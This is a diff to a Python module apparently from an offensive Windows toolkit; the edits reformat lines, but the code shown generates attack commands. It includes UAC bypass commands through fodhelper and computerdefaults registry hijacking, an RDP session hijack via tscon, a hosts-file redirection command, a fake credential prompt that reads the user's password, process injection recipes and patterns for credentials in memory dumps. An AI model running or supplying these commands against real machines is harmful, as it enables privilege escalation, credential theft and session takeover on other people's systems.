@@ -12,7 +12,8 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
-from typing import List, Dict
+from typing import List, Dict, Any
+
 
 class WindowsIntelligence:
     """Intelligence engine for Windows-specific enumeration and discovery."""
@@ -31,7 +32,10 @@ class WindowsIntelligence:
             "pipes": "SELECT * FROM pipes;",
             "scheduled_tasks": "SELECT name, action, path FROM scheduled_tasks;",
             "services": "SELECT name, display_name, start_type, status FROM services;",
-            "process_connections": "SELECT p.name, p.path, pos.local_address, pos.remote_address FROM processes p JOIN process_open_sockets pos USING (pid);"
+            "process_connections": (
+                "SELECT p.name, p.path, pos.local_address, pos.remote_address "
+                "FROM processes p JOIN process_open_sockets pos USING (pid);"
+            )
         }
 
     @staticmethod
@@ -46,7 +50,7 @@ class WindowsIntelligence:
         ]
 
     @staticmethod
-    def get_memory_credential_artifacts() -> Dict[str, Dict[str, str]]:
+    def get_memory_credential_artifacts() -> Dict[str, Dict[str, Any]]:
         """Registry of regex patterns for finding credentials in process memory dumps."""
         return {
             "firefox": {
@@ -128,7 +132,9 @@ class WindowsIntelligence:
             "ssdeep_fuzzy_hash": "Context-triggered piecewise hashes for similarity detection",
             "cert_revocation_status": "Verifying if signing certificate has been revoked via CRL/OCSP",
             "authenticode_chain_validity": "Full chain validation for signed binaries",
-            "interesting_strings_discovery": "Searching for compiler markers (Go, Rust), debug paths, and project names",
+            "interesting_strings_discovery": (
+                "Searching for compiler markers (Go, Rust), debug paths, and project names"
+            ),
             "entropy_high_threshold": "Entropy > 7.2 often indicates XOR/AES payload within a section"
         }
 
@@ -146,7 +152,9 @@ class WindowsIntelligence:
                 "[Environment]::UserName,[Environment]::UserDomainName); "
                 "$cred.getnetworkcredential().password"
             ),
-            "hosts_redirection": "Add-Content -Path C:\\Windows\\System32\\drivers\\etc\\hosts -Value \"`n{ip} {domain}\""
+            "hosts_redirection": (
+                "Add-Content -Path C:\\Windows\\System32\\drivers\\etc\\hosts -Value \"`n{ip} {domain}\""
+            )
         }
 
     @staticmethod
@@ -182,7 +190,11 @@ class WindowsIntelligence:
     @staticmethod
     def get_rdp_hijack_command(session_id: int, target_session_id: int = 0) -> str:
         """Generates a command to hijack an RDP session using tscon."""
-        return f"tscon {session_id} /dest:console" if target_session_id == 0 else f"tscon {session_id} /dest:{target_session_id}"
+        return (
+            f"tscon {session_id} /dest:console"
+            if target_session_id == 0
+            else f"tscon {session_id} /dest:{target_session_id}"
+        )
 
     @staticmethod
     def get_api_hooking_primitives() -> Dict[str, str]:
@@ -209,8 +221,12 @@ class WindowsIntelligence:
     def get_process_injection_techniques() -> Dict[str, str]:
         """Advanced process injection methodologies."""
         return {
-            "threadless_injection": "Hooking a frequently called export (e.g., AmsiScanBuffer) to trigger shellcode execution.",
-            "early_bird_apc": "Queueing an APC to a thread in a suspended state (NtQueueApcThread) before resuming.",
+            "threadless_injection": (
+                "Hooking a frequently called export (e.g., AmsiScanBuffer) to trigger shellcode execution."
+            ),
+            "early_bird_apc": (
+                "Queueing an APC to a thread in a suspended state (NtQueueApcThread) before resuming."
+            ),
             "module_stomping": "Overwriting an unused DLL in the target process memory with shellcode.",
             "process_hollowing": "Starting a suspended process, unmapping its memory, and replacing it with own code."
         }
@@ -219,8 +235,8 @@ class WindowsIntelligence:
     def get_uac_bypass_commands(executable_path: str) -> List[str]:
         """Commands for UAC bypass via registry hijacking (fodhelper, computerdefaults)."""
         return [
-            f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{executable_path}\" /f",
-            "reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /f",
+            f"reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{executable_path}\" /f",
+            r"reg add hkcu\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /f",
             "fodhelper.exe",
             "computerdefaults.exe"
         ]
